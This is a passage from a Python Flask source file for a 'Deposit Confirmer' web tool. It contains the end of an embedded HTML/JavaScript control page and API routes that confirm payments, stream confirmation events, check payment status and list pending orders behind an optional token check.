    setStatus(last.ok ? 'ok' : (last.error ? 'err':'ok'),
              last.ok ? 'Paid ✔' : (last.error ? 'Failed ✗' : 'Done'));
  }catch(e){
    $('log').innerHTML = `<span class="r">Request error: ${esc(e)}</span>`;
    setStatus('err','Error ✗');
  }finally{
    btn.disabled = false;
    $('chk').disabled = false;
  }
}

$('go').addEventListener('click', ()=>callConfirm($('go')));
$('chk').addEventListener('click', ()=>callStatus($('chk')));
$('url').addEventListener('keydown', e => { if(e.key === 'Enter') callConfirm($('go')); });
</script>
</body>
</html>
"""


@app.before_request
def _auth():
    if not AUTH_TOKEN:
        return None
    tok = request.args.get("key") or request.headers.get("X-Auth-Token", "")
    if tok == AUTH_TOKEN:
        return None
    return Response("unauthorized", 401, mimetype="text/plain")


@app.after_request
def _no_buffer(resp):
    resp.headers["Cache-Control"] = "no-store"
    resp.headers["X-Accel-Buffering"] = "no"
    return resp


@app.route("/")
def index():
    return Response(PAGE, mimetype="text/html")


@app.route("/api/confirm", methods=["POST"])
def api_confirm():
    sid = uuid.uuid4().hex[:8]
    payload = request.get_json(silent=True) or {}
    user_input = payload.get("input") or payload.get("url") or ""
    log(f"[{sid}] confirm request: {user_input[:160]}")
    try:
        result = run_confirmation(user_input)
    except Exception as e:
        result = {"ok": False, "steps": [], "error": f"engine error: {type(e).__name__}: {e}"}
    log(f"[{sid}] result ok={result.get('ok')} order={result.get('orderCode')} err={result.get('error')}")
    return jsonify(result)


@app.route("/api/stream-confirm", methods=["POST"])
def api_stream_confirm():
    sid = uuid.uuid4().hex[:8]
    payload = request.get_json(silent=True) or {}
    user_input = payload.get("input") or payload.get("url") or ""
    log(f"[{sid}] stream-confirm request: {user_input[:160]}")

    def generate():
        last = None
        try:
            for event in run_confirmation_events(user_input):
                last = event
                yield json.dumps(event, ensure_ascii=False) + "\n"
        except Exception as e:
            last = {
                "ok": False, "steps": (last or {}).get("steps") or [],
                "error": f"engine error: {type(e).__name__}: {e}",
                "type": "final",
            }
            yield json.dumps(last, ensure_ascii=False) + "\n"
        log(f"[{sid}] stream result ok={(last or {}).get('ok')} order={(last or {}).get('orderCode')} err={(last or {}).get('error')}")

    return Response(generate(), mimetype="application/x-ndjson")


@app.route("/api/status", methods=["POST"])
def api_status():
    sid = uuid.uuid4().hex[:8]
    log(f"[{sid}] status request")
    payload = request.get_json(silent=True) or {}
    user_input = payload.get("input") or payload.get("url") or ""
    try:
        result = probe_status(user_input)
    except Exception as e:
        result = {"steps": [], "error": f"engine error: {type(e).__name__}: {e}"}
    result.setdefault("ok", not result.get("error"))
    return jsonify(result)


@app.route("/api/recent")
def api_recent():
    rows, err = fetch_recent_orders(page_size=200)
    if err and not rows:
        return jsonify({"ok": False, "error": err}), 200
    pending = [r for r in rows if r.get("status") in (0, 3)]
    pending.sort(key=lambda x: str(x.get("createTime") or ""), reverse=True)
    return jsonify({"ok": True, "count": len(pending), "orders": pending[:20]})


if __name__ == "__main__":
    log(f"Deposit Confirmer starting on http://{HOST}:{PORT}")
    if not MERCHANT_SECRET:
        log("WARNING: WB_MERCHANT_SECRET not set - confirm engine cannot sign requests")
    app.run(host=HOST, port=PORT, threaded=True, debug=False)
